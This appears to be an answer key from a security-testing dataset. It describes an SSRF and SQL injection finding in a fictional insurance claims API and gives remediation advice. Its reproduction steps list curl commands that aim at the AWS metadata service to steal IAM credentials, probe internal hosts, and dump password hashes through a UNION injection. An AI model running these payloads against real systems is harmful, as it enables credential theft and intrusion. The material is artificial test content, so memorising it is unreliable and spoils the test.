# Expected Response

## System
- System: ClaimsFlow Underwriting API v3.3.0
- Domain: INSURANCE / CLAIMS PROCESSING
- Example ID: INJ-0112
- Risk ID: RISK-INJ-112
- Vulnerability: SSRF (Server-Side Request Forgery)

## Findings

### 1. SSRF on `/api/v1/records?filter=` (HAR Primary)

The `filter` parameter is supplied to a backend HTTP fetch handler without sanitization. The HAR capture shows `filter=http://169.254.169.254/latest/meta-data/` — an SSRF payload targeting the AWS EC2 instance metadata service — submitted to `GET /api/v1/records`. The response returns user records (SQL-structured), indicating the endpoint has a dual code path (SQL lookup for non-URL values, HTTP fetch for URL-like values), or the code snippet reflects the SQL path while the backend also issues HTTP requests with the filter value.

**Note on internal inconsistency:** Section 2.0 describes the database as "backend HTTP fetch" while the code snippet (Section 3.0) shows raw SQL string concatenation. The HAR payload is an SSRF URL and the response is SQL-shaped user data. The primary declared vulnerability is SSRF; SQLi is a secondary path exposed by the same raw-concatenation debt.

**Evidence from HAR:**
- Endpoint: `GET /api/v1/records?filter=http://169.254.169.254/latest/meta-data/`
- Response: HTTP 200 with user records including `password_hash` and `role: "ADMIN"`
- No sanitization of URL-scheme values in `filter` parameter

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.claimsflow-unde.example.com/api/v1/records?filter=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns matching records only.

**Step 2 — SSRF: AWS metadata exfiltration (primary HAR attack):**
```bash
curl -s "https://api.claimsflow-unde.example.com/api/v1/records?filter=http://169.254.169.254/latest/meta-data/" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** AWS EC2 instance metadata returned (IAM role names, instance ID, AMI ID) — or SQL user records if the SQL path executes first. Either confirms unvalidated external URL injection.

**Step 3 — SSRF escalation: IAM credentials from metadata service:**
```bash
curl -s "https://api.claimsflow-unde.example.com/api/v1/records?filter=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** IAM role name returned; follow with role-specific URL to obtain `AccessKeyId`, `SecretAccessKey`, `Token` — full AWS credential theft from insurance platform.

**Step 4 — SSRF: internal service enumeration:**
```bash
curl -s "https://api.claimsflow-unde.example.com/api/v1/records?filter=http://internal-db.claimsflow.local:5432/" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** Response delay or error message reveals internal service existence (port scanning via SSRF).

**Step 5 — SQLi path: data exfiltration via UNION (db_owner, from code snippet):**
```bash
curl -s "https://api.claimsflow-unde.example.com/api/v1/records?filter=' UNION SELECT username,password_hash,role FROM users--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All user credentials returned including `role: "ADMIN"` — as observed in HAR response.

**Step 6 — Verbose error confirmation:**
```bash
curl -s "https://api.claimsflow-unde.example.com/api/v1/records?filter='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected verbose error:** SQL syntax error message leaking table name `records`, column names, or DB version.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- **SSRF fix:** Validate `filter` values against an allowlist of expected patterns; reject URL-scheme values (`http://`, `https://`, `file://`, `ftp://`). Use a URL allowlist library.
- **Block metadata endpoints:** Deny outbound HTTP requests to `169.254.169.254` and other link-local/RFC-1918 ranges at the network layer and in application code.
- **SQLi fix (RISK-INJ-112):** Replace raw string concatenation with parameterized queries or prepared statements throughout `/api/v1/records`.
- **Restrict DB account:** Application account should only have `SELECT`/`INSERT`/`UPDATE`/`DELETE` on required tables — not `db_owner`.
- **Disable verbose error messages in production:** Return generic 400/500 without DB details.
- **Deploy WAF / input validation middleware** on legacy endpoints.
